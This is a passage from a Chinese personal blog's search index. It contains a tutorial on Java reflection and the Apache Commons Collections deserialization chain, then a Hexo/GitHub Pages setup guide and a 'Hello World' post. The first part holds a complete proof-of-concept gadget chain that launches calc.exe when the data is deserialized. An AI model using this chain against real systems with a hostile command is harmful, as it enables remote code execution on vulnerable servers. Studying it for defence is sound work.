Class[].class}是getMethod的2个参数参数类型，一个是String，一个是class[] 第三个参数new Object[]{“getRuntime”, new Class[0]}是getMethod的2个参数值，一个是getRuntime，一个是空，因为是数组形式所以要这么写 getMethod(&lt;String&gt; “getRuntime”, &lt;Class[]&gt; null) invoke(&lt;Object&gt;null, &lt;Object[]&gt;null) exec(&lt;String&gt;\"“calc.exe”\") 就是通过反射去调用Runtime.getRuntime().exec(“calc.exe”) Java反射机制 java中执行系统命令的方法为 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime.getRuntime().exec(\"calc\"); }} 正常的执行步骤为 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime runtime = Runtime.getRuntime(); runtime.exec(\"calc\"); } } 相对应的反射代码为 123456public class Exec { public static void main(String[] args)throws Exception{ Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); }} Method Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)的作用是获得对象所声明的公开方法。该方法的第一个参数name是要获得方法的名字，第二个参数parameterTypes是按声明顺序标识该方法形参类型。 getMethod(方法名, 方法类型) Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); 等价于 Object runtime = java.lang.Runtime.getRuntime() person.getClass().getMethod(“Speak”, null); 获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null person.getClass().getMethod(“run”, String.class); 获得person对象的run方法，因为run方法的形参是String类型的，所以parameterTypes为String.class Method Class.invoke(Object obj, Object… args) invoke(某个对象实例， 传入参数) Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); 等价于 runtime.exec(\"calc\"); 调用生成的runtime实例的exec方法，并将\"clac\"参数传入exec()方法 实际利用 对象是可以被反序列化，但并不在反序列化时触发调用链，而是要经过迭代器迭代并且使用 setValue() 方法才行，正常情况下基本不会有这种场景。 sun.reflect.annotation.AnnotationInvocationHandler该类中重写了readObject方法,在被调用时会执行setValue操作, 如果能把TransformedMap装入这个AnnotationInvocationHandler类就可以实现任意代码执行 利用代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class AExec implements Serializable { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(\"value\", \"value\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(java.lang.annotation.Target.class, transformedMap); //Object instance = ctor.newInstance(java.lang.annotation.Retention.class, transformedMap); //序列化 FileOutputStream fileOutputStream = new FileOutputStream(\"serialize3.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(instance); objectOutputStream.close(); //反序列化 FileInputStream fileInputStream = new FileInputStream(\"serialize3.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); }} java.lang.Runtime#exec(java.lang.String) 在exec处添加断点 查看调用链 sun.reflect.annotation.AnnotationInvocationHandler#readObject 传入的第一个参数 var1 必须为继承Annotation的子类，Annotation这个接口是所有注解类型的公用接口，所有注解类型都实现了这个接口。 java.lang.annotation.Retention.class java.lang.annotation.Target.class 否则在这个地方就return，不会继续向下执行了 传入的第二个参数 var2 则是构造的调用链 同时map的键值必须为\"value\"，否则利用不成功，这是一处小细节~ Java 反序列化漏洞始末（1）— Apache Commons 浅显易懂的JAVA反序列化入门 手把手教你写JAVA反序列化的POC document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hexo搭建个人博客","slug":"Hexo搭建个人博客","date":"2020-08-15T15:54:00.000Z","updated":"2021-03-09T15:57:27.161Z","comments":true,"path":"2020/08/15/Hexo搭建个人博客/","link":"","permalink":"http://yoursite.com/2020/08/15/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"搭建博客 环境搭建 安装 Git &amp;&amp; Node.js Git Node.js","text":"搭建博客 环境搭建 安装 Git &amp;&amp; Node.js Git Node.js 安装 Hexo Git 和 Node.js 安装好之后，首先创建一个用于存放博客文件的文件夹，进入文件夹后，安装并使用 Hexo 。 12$ npm install -g hexo-cli$ hexo init 安装完成之后，文件夹的目录如下： |——node_modules |——public |——scaffolds |——source |——themes |——_config.yml |——.gitignore |——db.json |——package.json |——package-lock.json 生成静态博客文件 在 Git Bash 终端执行命令： 12$ hexo g # 生成$ hexo s # 启动服务 在浏览器中访问 http://localhost:4000/ 将博客部署到 Github 上 创建仓库 创建一个名为你用户名.github.io的仓库，(必须是用户名，其他名称无效),以后的访问地址就是 http://用户名.github.io 配置 SSH 密钥 查看本机是否存在 .ssh 目录 1$ cd ~/.ssh 如果不存在，则创建一对新的 SSH 密钥 123$ssh-keygen -t rsa -C \"your_email@example.com\" # 这将按照你提供的邮箱地址，创建一对密钥Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/you/.ssh/id_rsa): [Press enter] 根据提示到输入密码和确认密码 12Enter passphrase (empty for no passphrase): [Type a passphrase]Enter same passphrase again: [Type passphrase again] 生成 SSH 之后 运行如下命令，将公钥的内容复制到系统粘贴板(clipboard)中： 1clip &lt; ~/.ssh/id_rsa.pub 粘贴公钥到 github --&gt; Settings --&gt; SSH keys 进行测试，看是否设置成功 1$ ssh -T git@github.com 设置用户信息 Git 会根据用户的名字和邮箱来记录提交，GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替。 123$ git config --global user.name \"Whippet\" #用户名$ git config --global user.email \"Whippet0@qq.com\" #邮箱$ git config --list #查看用户信息 本地的 Hexo 文件 更新到 Github 登陆 Github 找到地址 https://github.com/Whippet0/Whippet0.github.io.git 复制至 hexo 安装目录下的 _config.yml 文件中 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/Whippet0/Whippet0.github.io.git branch: master 在 hexo 文件夹下执行 1234$ hexo g$ hexo d或者$ hexo g -d 如果 hexo d 的时候报错 ERROR Deployer not found: git 执行 npm install hexo-deployer-git --save 然后需要输入 github 的账号和密码 成功之后访问 https://whippet0.github.io/ 美化博客 进入 hexo 主题官网 挑选我们喜欢的主题，复制主题的地址 https://github.com/Molunerfinn/hexo-theme-melody 打开Hexo文件夹 按照 github 上的提示进行操作 若没有提示则直接 git clone 该文件夹。 下载完成后，打开Hexo文件夹下的配置文件_config.yml 修改参数为：theme: melody 在 Git Bash 终端执行命令： 12$ hexo g # 生成$ hexo s # 启动服务 在浏览器中访问 http://localhost:4000/ 在本地进行查看 部署主题到github 上 12hexo clean (必须要，不然有时因为缓存问题，服务器更新不了主题)hexo g -d 最后我选择了这个主题 stun 因为有配套的中文说明，所以配置起来很方便。 同时也可以让博客上添加一些 Emoji 👴 发布文章 图片配置 在根目录下配置文件_config.yml 中 post_asset_folder: true 安装插件 1$ npm install https://github.com/CodeFalling/hexo-asset-image -- save 利用 hexo n \"文章名称\" 在 source\\_posts下生成一个新的文章时，同时也会生成一个文章名称的文件夹，把图片放在文章名称文件夹下，在 markdown 中利用图片时是需要加上文件夹的目录，但是上传至 github 时 并不需要文件夹的目录。 然后就利用 Oah 的脚本，轻松解决了这个问题。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-08-15T13:31:50.000Z","updated":"2021-03-09T15:57:27.160Z","comments":true,"path":"2020/08/15/hello-world/","link":"","permalink":"http://yoursite.com/2020/08/15/hello-world/","excerpt":"","text":"Hello word 😄 😄 😄 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]}],"categories":[],"tags":[]}